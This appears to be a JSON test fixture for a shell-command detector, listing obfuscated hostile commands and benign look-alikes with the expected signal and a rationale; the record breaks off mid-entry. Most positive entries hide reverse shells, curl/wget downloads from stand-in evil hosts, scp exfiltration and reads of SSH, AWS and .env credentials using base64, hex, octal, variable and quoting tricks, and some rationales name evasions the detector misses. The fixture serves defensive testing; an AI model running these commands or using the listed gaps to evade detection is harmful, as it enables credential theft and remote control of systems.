[
  {
    "command": "echo V1ROV2VXSkRRbTlrU0ZKM1kzcHZka3d5VmpKaFYzZDFaRWRXZW1SRE9UUT0= | base64 -d | base64 -d | base64 -d | bash",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "triple-base64 of 'curl https://evil.test/x'; normalizer peels 3 layers (_MAX_PASSES=3) to expose curl"
  },
  {
    "command": "echo Nzc2NzY1NzQyMDY4NzQ3NDcwM2EyZjJmNjU3ODY5NmMyZTc0NjU3Mzc0MmY3OA== | base64 -d | xxd -r -p | sh",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "base64 wraps a bare-hex blob of 'wget http://evil.test/x'; b64 layer then hex layer surfaces wget"
  },
  {
    "command": "$(printf '\\143\\165\\162\\154') http://evil.test/x | sh",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "octal \\nnn printf escapes spell curl; _unescape_c decodes octal in place"
  },
  {
    "command": "$'\\x6e\\x63' -e /bin/sh 10.0.0.1 4444",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "ANSI-C $'\\x6e\\x63' decodes to nc in place, exposing the network tool"
  },
  {
    "command": "$'\\x6e\\x63' -e /bin/sh 10.0.0.1 4444",
    "target_signal": "c2.reverse_shell",
    "should_fire": true,
    "rationale": "ANSI-C-hidden nc plus literal -e /bin/sh is a reverse shell once de-obfuscated"
  },
  {
    "command": "$(printf '\\x73\\x63\\x70') /etc/passwd attacker@evil.test:/loot",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "printf hex escapes spell scp; raw-string regex misses it, normalizer unescapes"
  },
  {
    "command": "A=wg;B=et;C=$A$B;$C http://evil.test/x | sh",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "chained var-of-var indirection C=$A$B resolves to wget at fixpoint"
  },
  {
    "command": "curl$IFS$9http://evil.test/x",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "$IFS$9 word-split trick; normalizer strips $IFS so the curl token surfaces with a boundary"
  },
  {
    "command": "cat $(printf '\\x7e\\x2f\\x2e\\x73\\x73\\x68\\x2f\\x69\\x64\\x5f\\x72\\x73\\x61')",
    "target_signal": "cred.read.ssh",
    "should_fire": true,
    "rationale": "printf hex escapes reconstruct ~/.ssh/id_rsa path hidden from the cred regex"
  },
  {
    "command": "cat $(printf '\\056\\141\\167\\163\\057\\143\\162\\145\\144\\145\\156\\164\\151\\141\\154\\163')",
    "target_signal": "cred.read.aws",
    "should_fire": true,
    "rationale": "octal printf escapes reconstruct .aws/credentials path"
  },
  {
    "command": "echo Y2F0IH4vLmVudi5wcm9kdWN0aW9u | base64 -d | bash",
    "target_signal": "cred.read.dotenv",
    "should_fire": true,
    "rationale": "base64 hides 'cat ~/.env.production'; layer decode exposes the .env dotenv path"
  },
  {
    "command": "echo cmVxdWVzdHMucG9zdChodHRwOi8vZXZpbC50ZXN0LCBkYXRhPW9wZW4oLmVudikucmVhZCgpKQ== | base64 -d | base64 -d | python3",
    "target_signal": "egress.http_client",
    "should_fire": true,
    "rationale": "double-base64 hides a requests.post(...) HTTP-client exfil call"
  },
  {
    "command": "c'u'r\"l\"$IFS-s$IFS http://evil.test/x",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "intra-token quote-noise c'u'r\"l\" stripped to fixpoint -> curl, with $IFS removed"
  },
  {
    "command": "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | bash",
    "target_signal": "c2.reverse_shell",
    "should_fire": true,
    "rationale": "base64 hides 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' reverse shell"
  },
  {
    "command": "$(printf '\\156\\143') -e /bin/bash 10.0.0.1 9001",
    "target_signal": "c2.reverse_shell",
    "should_fire": true,
    "rationale": "octal printf spells nc; with -e /bin/bash it is a reverse shell"
  },
  {
    "command": "echo aWQ= | base64 --decode | sh",
    "target_signal": "exec.pipe_to_shell",
    "should_fire": true,
    "rationale": "base64 --decode piped into sh is the pipe-to-shell decode-and-exec primitive"
  },
  {
    "command": "E=ev;A=al;$E$A \"$(echo Y3VybCBldmls | base64 -d)\"",
    "target_signal": "exec.pipe_to_shell",
    "should_fire": true,
    "rationale": "chained var indirection builds the 'eval' token from $E$A"
  },
  {
    "command": "echo dXJsbGliLnJlcXVlc3QudXJsb3BlbihodHRwOi8vZXZpbC50ZXN0LytvcGVuKC5lbnYpLnJlYWQoKSk= | base64 -d | base64 -d | python3 -",
    "target_signal": "egress.http_client",
    "should_fire": true,
    "rationale": "double-base64 hides a urllib.request.urlopen HTTP-client call"
  },
  {
    "command": "echo c2NwIH4vLmF3cy9jcmVkZW50aWFscyBldmlsLnRlc3Q6L2xvb3Q= | base64 -d | sh",
    "target_signal": "cred.read.aws",
    "should_fire": true,
    "rationale": "single base64 blob hides scp of ~/.aws/credentials (yields both cred and egress)"
  },
  {
    "command": "git checkout 9a3f2b1c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f90",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "40-char git SHA is valid hex but decodes to opaque bytes; _looks_like_command junk filter rejects it"
  },
  {
    "command": "npm ci --integrity sha512-Z3JlZW5pbnRlZ3JpdHloYXNobm90YWNvbW1hbmQ=",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "package integrity sha512 base64 decodes to non-command junk; rejected, no curl forged"
  },
  {
    "command": "echo e25hbWU6YnVpbGQsb2s6dHJ1ZSxjb3VudDo0Mn0= | base64 -d > config.json",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "base64 holds JSON DATA written to a file, not a command; nothing decodes to a network tool"
  },
  {
    "command": "printf '%s\\n' \"$HOME/project/build\"",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "printf %s format string with no \\xHH escape payload; nothing unescapes to curl"
  },
  {
    "command": "export PATH=$HOME/.local/bin:$PATH; make build",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "legit $HOME/$PATH env-var expansion in a build script; no hidden network tool"
  },
  {
    "command": "docker pull alpine@sha256:9b2a28eb47540823042a2ba401386845089bb7b62a9637d55816132c4c3c36eb",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "sha256 image digest hex is opaque; junk filter blocks a forged egress signal"
  },
  {
    "command": "printf '\\150\\145\\154\\154\\157\\040\\167\\157\\162\\154\\144\\n'",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "octal printf escapes spell 'hello world', not a network tool; escape decoding must not forge curl"
  },
  {
    "command": "CURL_HOME=/opt/curl; echo $CURL_HOME",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "benign var holding a path; 'curl' appears only as a path substring of /opt/curl, not a curl invocation (exposes a \\bcurl\\b over-match FP)"
  },
  {
    "command": "a=cu;b=rl;c=$a$b;$c https://evil.test/x",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "curl built by chained var concat A=cu;B=rl;C=$A$B;$C — normalizer resolves chained assignments to a fixpoint."
  },
  {
    "command": "x=cur;y=l;z=$x$y;eval $z https://drop.test",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "var-of-var ($z = $x$y) reconstructs curl; normalizer expands $VAR to a fixpoint."
  },
  {
    "command": "wget$IFS$9https://evil.test/payload",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "$IFS$9 word-split separator hides the space after wget; $IFS is stripped to whitespace."
  },
  {
    "command": "a=cu;b=rl;${a}${b}${IFS}https://evil.test",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "brace-var concat plus ${IFS} separator; both var-expand and IFS-strip apply."
  },
  {
    "command": "p=nc;q=at;$p$q -e /bin/sh 10.0.0.1 4444",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "ncat assembled from $p$q var concat hiding the network-tool token."
  },
  {
    "command": "scp$IFS$9dump.sql$IFS$9user@evil.test:/tmp",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "scp hidden by $IFS$9 separators replacing every space on the line."
  },
  {
    "command": "t=s;u=cp;$t$u secrets.tar.gz user@evil:/tmp",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "scp split across two vars $t$u; concatenation rebuilds the egress tool."
  },
  {
    "command": "c'u'r'l' https://evil.test/exfil",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "intra-token single-quote noise c'u'r'l' collapses to curl via fixpoint quote-strip."
  },
  {
    "command": "d=.ss;e=h;cat ~/$d$e/id_ed25519",
    "target_signal": "cred.read.ssh",
    "should_fire": true,
    "rationale": ".ssh path segment built from $d$e var concat; expansion exposes the .ssh/ token."
  },
  {
    "command": "k=myid_rsabak;f=${k:2:6};cat ~/.ssh/$f",
    "target_signal": "cred.read.ssh",
    "should_fire": true,
    "rationale": "the literal ~/.ssh/ on the line fires cred.read.ssh regardless of the substring-sliced filename."
  },
  {
    "command": "cat ~/$(printf '\\x2e\\x73\\x73\\x68')/id_rsa",
    "target_signal": "cred.read.ssh",
    "should_fire": true,
    "rationale": ".ssh hidden as printf '\\x2e\\x73\\x73\\x68' hex escapes, unescaped in place to .ssh."
  },
  {
    "command": "a=.aws/;b=credentials;cat ~/$a$b",
    "target_signal": "cred.read.aws",
    "should_fire": true,
    "rationale": ".aws/credentials path reassembled from $a$b var concat."
  },
  {
    "command": "a=.en;b=v;cat $a$b",
    "target_signal": "cred.read.dotenv",
    "should_fire": true,
    "rationale": ".env built by concatenating $a$b vars to hide the dotenv token."
  },
  {
    "command": "n=.net;r=rc;cat ~/$n$r",
    "target_signal": "cred.read.dotenv",
    "should_fire": true,
    "rationale": ".netrc credential file path split across $n$r vars."
  },
  {
    "command": "c=base64;$c -d payload.b64 | sh",
    "target_signal": "exec.pipe_to_shell",
    "should_fire": true,
    "rationale": "base64 binary name hidden behind $c var indirection, piped to sh."
  },
  {
    "command": "e=ev;v=al;$e$v \"$(cat ./stage)\"",
    "target_signal": "exec.pipe_to_shell",
    "should_fire": true,
    "rationale": "eval reconstructed from $e$v var concat to dodge the literal-eval regex."
  },
  {
    "command": "n=$(printf '\\x6e\\x63');$n -e /bin/bash 1.1.1.1 4444",
    "target_signal": "c2.reverse_shell",
    "should_fire": true,
    "rationale": "nc hidden as printf hex, then var-indirected; nc -e reverse-shell form survives."
  },
  {
    "command": "A=n;B=c;C=$A$B;D=$C;$D -e /bin/sh 5.5.5.5 4444",
    "target_signal": "c2.reverse_shell",
    "should_fire": true,
    "rationale": "four-level var indirection D=$C=$A$B rebuilds nc -e reverse shell."
  },
  {
    "command": "h=/dev/tcp;bash -i >& $h/1.2.3.4/9001 0>&1",
    "target_signal": "c2.reverse_shell",
    "should_fire": true,
    "rationale": "/dev/tcp prefix stashed in $h then expanded back into the bash -i >& reverse shell."
  },
  {
    "command": "m=urllib;python3 -c \"import $m.request\"",
    "target_signal": "egress.http_client",
    "should_fire": true,
    "rationale": "urllib module name hidden in $m var, expanded to urllib.request HTTP client."
  },
  {
    "command": "a=ec;b=ho;$a$b 'build complete' >> ./out.log",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "benign $a$b concat just rebuilds echo, not any network tool."
  },
  {
    "command": "p=${HOME:0:5};echo deploying from $p",
    "target_signal": "cred.read.ssh",
    "should_fire": false,
    "rationale": "real ${HOME:0:5} substring slice of a legit env var — no .ssh/id_rsa token."
  },
  {
    "command": "u=https://api.internal;echo ${u//https/http}",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "${x//y/z} replace on a URL string, no curl/wget/nc verb — only echo."
  },
  {
    "command": "tgt=$AWS_REGION;echo deploying to $tgt",
    "target_signal": "cred.read.aws",
    "should_fire": false,
    "rationale": "$AWS_REGION is a normal env var; no .aws/credentials path despite the AWS name."
  },
  {
    "command": "d=config;cat $HOME/.$d/app.toml",
    "target_signal": "cred.read.dotenv",
    "should_fire": false,
    "rationale": "var concat builds .config/app.toml, a benign path with no .env/.pem/.netrc token."
  },
  {
    "command": "ssh-keygen -t ed25519 -f ./deploy_key",
    "target_signal": "cred.read.ssh",
    "should_fire": false,
    "rationale": "generates a key; ed25519 lacks the id_ prefix and there is no .ssh/ path, so the regex must not match."
  },
  {
    "command": "v=a-b-c;echo ${v//-/_}",
    "target_signal": "exec.pipe_to_shell",
    "should_fire": false,
    "rationale": "benign ${x//y/z} dash-to-underscore replace; no eval/base64 -d/pipe-to-sh."
  },
  {
    "command": "git checkout 3f9a2b1c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f90",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "40-hex git SHA is rejected by the junk filter as non-command-like, so no forged token."
  },
  {
    "command": "git checkout 5d41402abc4b2a76b9719d911017c592a1b2c3d4e5f60718",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "40-char git SHA is a long bare-hex run the hex decoder tries, but it decodes to binary junk that fails _looks_like_command, so no curl/wget token is forged."
  },
  {
    "command": "npm ci --integrity sha512-Q5VAGFLI3oE3LXc6E1mY3jU3hX2bX1nF9Gk1234567890abcdefghij=",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "npm sha512 integrity is a real base64 blob >16 chars, but b64-decodes to non-ASCII hash bytes rejected by the junk filter; no network tool inside."
  },
  {
    "command": "docker pull alpine@sha256:e9adb5357e84d853cd6d3fb1c2b6dd9b13b2f7d6e8a9c0b1a2f3e4",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "Docker content digest is a 64-char hex string the decoder probes, but it yields opaque binary and is filtered; docker pull is not a flagged egress tool."
  },
  {
    "command": "B=build; D=dist; rm -rf $B $D && mkdir $B $D",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "Var indirection that the normalizer fully expands to 'build'/'dist' — legit build cleanup, expansion exposes no curl/wget/nc/scp/sftp."
  },
  {
    "command": "echo $PATH | tr : \"\\n\" | sort",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "$PATH is a real env var; the normalizer leaves unknown vars intact and the piped pipeline contains no network tool."
  },
  {
    "command": "npm install axios node-fetch && grep -rn \"fetch(\" src/",
    "target_signal": "egress.http_client",
    "should_fire": false,
    "rationale": "Bare library names and a code-grep for 'fetch(' — http_client is anchored to fetch('http... call forms, so installing/searching does not fire."
  },
  {
    "command": "pip install requests httpx urllib3 && pytest tests/",
    "target_signal": "egress.http_client",
    "should_fire": false,
    "rationale": "Bare lib names requests/httpx/urllib3 with no .get/.post call form — the regex is anchored to call syntax, so dependency install stays quiet."
  },
  {
    "command": "git commit -m \"use requests instead of urllib for http post handler\"",
    "target_signal": "egress.http_client",
    "should_fire": false,
    "rationale": "Commit message prose mentions requests/urllib/http post but never as a call form (no requests.post / http POST <url>), so the anchored pattern misses it."
  },
  {
    "command": "yarn add got # sha512-aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789plusABCDEFGHIJ==",
    "target_signal": "egress.http_client",
    "should_fire": false,
    "rationale": "Yarn integrity base64 in a comment decodes to junk and is filtered; 'got' is a bare lib name with no HTTP call form."
  },
  {
    "command": "echo \"$USER on $HOSTNAME at $HOME\" && ls $HOME/projects",
    "target_signal": "cred.read.ssh",
    "should_fire": false,
    "rationale": "Real env vars $USER/$HOME left intact by the normalizer; the path expands to a projects dir, never .ssh/ or id_rsa."
  },
  {
    "command": "K=id; V=card; echo \"$K$V scanner ready\"",
    "target_signal": "cred.read.ssh",
    "should_fire": false,
    "rationale": "Var-of-var concatenation that the normalizer resolves to 'idcard' — a benign lookalike near id_rsa that never produces the .ssh/id_rsa token."
  },
  {
    "command": "aws s3 ls s3://public-data/ --no-sign-request | head",
    "target_signal": "cred.read.aws",
    "should_fire": false,
    "rationale": "Anonymous public-bucket listing; no .aws/credentials or .aws/config path is present, so the credential-file regex does not match."
  },
  {
    "command": "mkdir -p ~/.config/myapp && printf \"region=%s\\n\" us-east-1 > ~/.config/myapp/app.ini",
    "target_signal": "cred.read.aws",
    "should_fire": false,
    "rationale": "printf uses a %s format spec (no \\x escapes to unescape) writing an app config; 'region' is AWS-flavored but the path is not .aws/credentials|config."
  },
  {
    "command": "npm run build && cat dist/manifest.json | jq .version",
    "target_signal": "cred.read.dotenv",
    "should_fire": false,
    "rationale": "A normal build reading a JSON manifest; no .env/.npmrc/.pem/.netrc token appears anywhere in the normalized text."
  },
  {
    "command": "P=package; echo \"reading $P.json\" && jq .name $P.json",
    "target_signal": "cred.read.dotenv",
    "should_fire": false,
    "rationale": "Var indirection expands to 'package.json' — looks like a dotfile read but resolves to a benign manifest, not .env/.pem/.netrc."
  },
  {
    "command": "python3 -c \"import base64,sys;open(chr(99)+chr(46)+chr(106),'wb').write(base64.b64decode(open('d.b64').read()))\"",
    "target_signal": "exec.pipe_to_shell",
    "should_fire": false,
    "rationale": "Python decodes base64 DATA to a file (chr-built name 'c.j'), not 'base64 -d' nor a pipe to sh and no eval — the pipe_to_shell forms are absent."
  },
  {
    "command": "cat data.b64 | base64 > /dev/null && echo length-check-ok",
    "target_signal": "exec.pipe_to_shell",
    "should_fire": false,
    "rationale": "base64 ENCODE (no -d/--decode flag) piped to /dev/null for a size check; pipe_to_shell needs '| sh', 'base64 -d', or eval, none present."
  },
  {
    "command": "openssl dgst -sha256 release.tar.gz | awk \"{print $2}\"",
    "target_signal": "exec.pipe_to_shell",
    "should_fire": false,
    "rationale": "Checksum pipeline into awk, not into a shell interpreter; no | sh/bash, base64 -d, or eval, so the pipe_to_shell regex stays quiet."
  },
  {
    "command": "jq -r .items[].id catalog.json | sort -u | wc -l",
    "target_signal": "exec.pipe_to_shell",
    "should_fire": false,
    "rationale": "Data pipeline through jq/sort/wc — pipes exist but the right-hand sides are data tools, never a shell interpreter, base64 -d, or eval."
  },
  {
    "command": "mkfifo pipe && gzip -c < pipe > out.gz & cat big.log > pipe",
    "target_signal": "c2.reverse_shell",
    "should_fire": false,
    "rationale": "mkfifo used for a legit gzip stream, not 'mkfifo ... | nc/cat' — the reverse-shell branch requires a fifo piped into n?cat, which is absent."
  },
  {
    "command": "echo \"connect to host:port for the demo\" >> README.md",
    "target_signal": "c2.reverse_shell",
    "should_fire": false,
    "rationale": "Prose mentioning host:port appended to docs; no /dev/tcp/, nc -e, or bash -i >& form for the reverse-shell pattern to match."
  },
  {
    "command": "socat -V | head -1",
    "target_signal": "c2.reverse_shell",
    "should_fire": false,
    "rationale": "socat version check; the reverse-shell branch requires 'socat ... exec', and a bare -V with no exec target does not match."
  },
  {
    "command": "echo WkRKa2JHUkRRbTlrU0ZKM1QyazRkbHBZV25CaVF6VjZZVU01TkE9PQ== | base64 -d | base64 -d | base64 -d | sh",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "Triple-base64-encoded 'wget http://evil.sh/x'; sits exactly at the 3-pass decode cap so the normalizer peels all three layers and exposes wget."
  },
  {
    "command": "echo V2tSS2EySkhVa1JSYlRsclUwWktNMVF5YXpSa2JIQlpWMjVDYVZGNlZqWlpWVTAxVGtFOVBRPT0= | base64 -d|base64 -d|base64 -d|base64 -d|sh",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "FOUR base64 layers of the same wget payload: a 4th layer beyond _MAX_PASSES=3 means the normalizer MUST miss it — included to confirm the cap leaks one layer deep."
  },
  {
    "command": "echo YzJOd0lDOWxkR012Y0dGemMzZGtJR1YyYVd3Nkx3PT0= | base64 -d | base64 -d | sh",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "Double-base64 of 'scp /etc/passwd evil:/' (encode+encode) within the 3-pass budget; layer-by-layer decode exposes scp."
  },
  {
    "command": "echo NmU2MzIwMmQ2NTIwMmY2MjY5NmUyZjczNjgyMDMxMzAyZTMwMmUzMDJlMzEyMDM0MzQzMw== | base64 -d | xxd -r -p | sh",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "base64-of-bare-hex of 'nc -e /bin/sh 10.0.0.1 443' (two stacked codecs); first pass yields the hex run, second pass decodes hex to expose nc."
  },
  {
    "command": "echo MmU3MzczNjgyZjY5NjQ1ZjY1NjQzMjM1MzUzMTM5 | base64 -d | xxd -r -p",
    "target_signal": "cred.read.ssh",
    "should_fire": true,
    "rationale": "base64-of-hex of the path '.ssh/id_ed25519' (encode+encode, no command verb); peeling both codecs reveals the SSH key path."
  },
  {
    "command": "printf '\\143\\165\\162\\154 http://evil' | sh",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "Octal \\nnn ANSI-C escapes for c-u-r-l unescaped in place by _unescape_inline; combines octal-encode with a pipe-to-shell context."
  },
  {
    "command": "pr'i'ntf '\\163\\143\\160 user@evil:/tmp a' | sh",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "TWO tricks: intra-token quote noise in printf plus octal escapes \\163\\143\\160 -> scp; quote-strip fixpoint then octal-unescape both fire."
  },
  {
    "command": "A=cu;B=rl;C=$A$B;$C http://evil.test",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "Chained var indirection C=$A$B then $C; _collect_vars resolves the var-of-var to a fixpoint, expanding $C to curl."
  },
  {
    "command": "P=bmMgLWUgL2Jpbi9zaA==; echo $P | base64 -d | sh",
    "target_signal": "c2.reverse_shell",
    "should_fire": true,
    "rationale": "Indirect + encode: a var holds base64 of 'nc -e /bin/sh'; var-expand then base64 decode exposes the nc -e reverse shell."
  },
  {
    "command": "curl${IFS}$9http://evil.test/x",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "$IFS$9 separator variant ($9 is empty in non-arg context); _strip_noise collapses ${IFS} to a space leaving curl intact."
  },
  {
    "command": "cat $(printf '\\x2e\\x73\\x73\\x68\\x2f\\x69\\x64\\x5f\\x72\\x73\\x61')",
    "target_signal": "cred.read.ssh",
    "should_fire": true,
    "rationale": "printf \\xHH hex escapes spell '.ssh/id_rsa' inside a command substitution; unescape-in-place reveals the SSH key path."
  },
  {
    "command": "echo Y3VybCBodHRwOi8vZXZpbA== > /tmp/p; base64 -d /tmp/p | bash",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "Split echo>file then decode-run, but the base64 blob still appears verbatim in the raw line so the decode pass exposes curl regardless of the file indirection."
  },
  {
    "command": "X=curlXX; ${X:0:4} http://evil.test/x",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "${x:0:2}-style substring slicing to carve 'curl' out of 'curlXX'; the normalizer has no bash parameter-expansion slicing, so this MISSES (gap)."
  },
  {
    "command": "echo lruc | rev | xargs -I{} {} http://evil.test/x",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "rev reverses 'lruc' to 'curl' at runtime; the normalizer models no rev transform, so the hidden tool is MISSED (char-reversal gap)."
  },
  {
    "command": "$(echo phey | tr 'a-z' 'n-za-m') http://evil.test/x",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "ROT13 via tr maps 'phey' -> 'curl'; the normalizer has no tr/char-substitution model, so it MISSES this (substitution-cipher gap)."
  },
  {
    "command": "echo -n cu >> /tmp/p; echo -n rl >> /tmp/p; printf ' http://evil\\n' >> /tmp/p; bash /tmp/p",
    "target_signal": "egress.network_tool",
    "should_fire": true,
    "rationale": "Payload assembled by appending char fragments to a file across statements; no single decodable blob or tracked var, so the normalizer MISSES it (cross-statement file-assembly gap)."
  },
  {
    "command": "git checkout 3f7a9c2e1b8d4f6a0c5e9b2d7a4f1e8c3b6d9a02",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "A 40-char git SHA looks like a long bare-hex blob but decodes to non-command bytes; _looks_like_command rejects it so no egress is forged."
  },
  {
    "command": "echo sha512-aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789abcdEFGHijklmNOPqrstuVWxyz== >> package-lock.json",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "npm integrity sha512 base64 hash is a benign data string; its decode is opaque junk filtered by _looks_like_command, no tool token appears."
  },
  {
    "command": "echo iVBORw0KGgoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | base64 -d > logo.png",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "Legit base64 PNG image data pipeline; decoded bytes are binary non-command, junk-filtered, so no egress.network_tool is forged (the literal 'base64 -d' is a separate real signal, not this target)."
  },
  {
    "command": "echo eyJ1c2VyIjoiYm9iIiwicm9sZSI6ImFkbWluIiwib2siOnRydWV9 | base64 -d > cfg.json",
    "target_signal": "egress.network_tool",
    "should_fire": false,
    "rationale": "base64 of benign JSON config data; decodes to '{\"user\":...}' which contains no network tool, so egress must not fire."
  },
  {
    "command": "printf '%s=%s\\n' API_KEY value > /tmp/build.env",
    "target_signal": "exec.pipe_to_shell",
    "should_fire": false,
    "rationale": "printf with a %s format string and no \\xHH/\\nnn escape payload; nothing decodes to a shell pipe, must not forge exec.pipe_to_shell."
  },
  {
    "command": "echo \"deploy to $HOME on $PATH\" && npm run build && tsc -p tsconfig.json",
    "target_signal": "egress.http_client",
    "should_fire": false,
    "rationale": "Real $HOME/$PATH env refs plus a benign build script; no var resolves to an HTTP client call, target must stay silent."
  },
  {
    "command": "echo \"integrity sha512-Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MA==\" >> yarn.lock",
    "target_signal": "exec.pipe_to_shell",
    "should_fire": false,
    "rationale": "yarn lockfile integrity base64 decodes to 'foobarbazqux1234567890' (printable but no shell/eval token), so exec.pipe_to_shell must not fire."
  },
  {
    "command": "echo Y2F0IH4vLnNzaC9pZF9lZDI1NTE5 | base64 -d | base64 -d | base64 -d | bash",
    "target_signal": "cred.read.ssh",
    "should_fire": true,
    "rationale": "Triple-base64 of 'cat ~/.ssh/id_ed25519'; the layer-by-layer decoder must peel all three to expose the .ssh/ path."
  },
  {
    "command": "echo Y2F0IH4vLnNzaC9pZF9yc2E= | base64 -d | bash",
    "target_signal": "cred.read.ssh",
    "should_fire": true,
    "rationale": "Single base64 blob hides 'cat ~/.ssh/id_rsa'; decode step exposes id_rsa to the regex."
  },
  {
    "command": "cat $(printf '\\x7e\\x2f\\x2e\\x73\\x73\\x68\\x2f\\x69\\x64\\x5f\\x72\\x73\\x61')",
    "target_signal": "cred.read.ssh",
    "should_fire": true,
    "rationale": "printf \\xHH escapes spell '~/.ssh/id_rsa' in place; inline unescape reveals the SSH key path."
  },
  {
    "command": "cat ~/$'\\x2e\\x73\\x73\\x68'/id_rsa",
    "target_signal": "cred.read.ssh",
    "should_fire": true,
    "rationale": "ANSI-C $'\\x2e\\x73\\x73\\x68' decodes to '.ssh' glued to /id_rsa, hiding the .ssh/ component."
  },
  {
    "command": "A=.aws;B=/credentials;cat ~$A$B",
    "target_signal": "cred.read.aws",
    "should_fire": true,
    "rationale": "Path built by concatenating var-of-var ($A$B) so '.aws/credentials' only appears after expansion."
  },
  {
    "command": "cat ~/2e6177732f63726564656e7469616c73",
    "target_signal": "cred.read.aws",
    "should_fire": true,
    "rationale": "Long bare-hex run decodes to '.aws/credentials'; the hex-token decoder must surface it."
  },
  {
    "command": "echo NWM2MTc0MjAzZTdlMmYyZTczNzM2ODJmNjk2NDVmNzI3MzYx | base64 -d | xxd -r -p | bash",
    "target_signal": "cred.read.ssh",
    "should_fire": true,
    "rationale": "base64-of-bare-hex: outer b64 yields a long hex run that hex-decodes to 'cat ~/.ssh/id_rsa' (double-encoding)."
  },
  {
    "command": "cat ./.e\"n\"v",
    "target_signal": "cred.read.dotenv",
    "should_fire": true,
    "rationale": "Intra-token quote noise .e\"n\"v collapses to .env at the quote-strip fixpoint."
  },
  {
    "command": "echo Y2F0IC5lbnYgfCBuYyBldmlsIDkwMDE= | base64 -d | sh",
    "target_signal": "cred.read.dotenv",
    "should_fire": true,
    "rationale": "base64 blob decodes to 'cat .env | nc evil 9001', exposing the .env read after decode."
  },
  {
    "command": "scp ~/$'\\056\\156\\145\\164\\162\\143' evil:/t",
    "target_signal": "cred.read.dotenv",
    "should_fire": true,
    "rationale": "Octal \\nnn ANSI-C escapes decode to '.netrc'; octal unescape exposes the .netrc secret path."
  },
  {
    "command": "H=/dev;T=/tcp;bash -i >& $H$T/10.0.0.1/4444 0>&1",
    "target_signal": "c2.reverse_shell",
    "should_fire": true,
    "rationale": "/dev/tcp split across $H$T var concatenation; only var-expansion reassembles the reverse-shell device."
  },
  {
    "command": "$'\\x6e\\x63' -e /bin/sh 10.0.0.1 4444",
    "target_signal": "c2.reverse_shell",
    "should_fire": true,
    "rationale": "ANSI-C $'\\x6e\\x63' decodes to 'nc' so the 'nc ... -e' reverse-shell form appears after unescape."
  },
  {
    "command": "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40LzkgMD4mMQ== | base64 -d | bash",
    "target_signal": "c2.reverse_shell",
    "should_fire": true,
    "rationale": "base64 hides 'bash -i >& /dev/tcp/1.2.3.4/9 0>&1'; decode exposes the /dev/tcp channel."
  },
  {
    "command": "bash -i >& /6465762f746370/1.1.1.1/4444 0>&1",
    "target_signal": "c2.reverse_shell",
    "should_fire": true,
    "rationale": "Bare-hex '6465762f746370' decodes to 'dev/tcp', reconstructing /dev/tcp/ after hex decode."
  },
  {
    "command": "n\"c\" -e /bin/bash 9.9.9.9 1337",
    "target_signal": "c2.reverse_shell",
    "should_fire": true,
    "rationale": "Quote noise n\"c\" collapses to 'nc', exposing the 'nc -e' reverse shell."
  },
  {
    "command": "bash -c \"$(printf '\\142\\141\\163\\150\\40\\55\\151\\40\\76\\46\\40\\57\\144\\145\\166\\57\\164\\143\\160\\57\\61\\57\\71')\"",
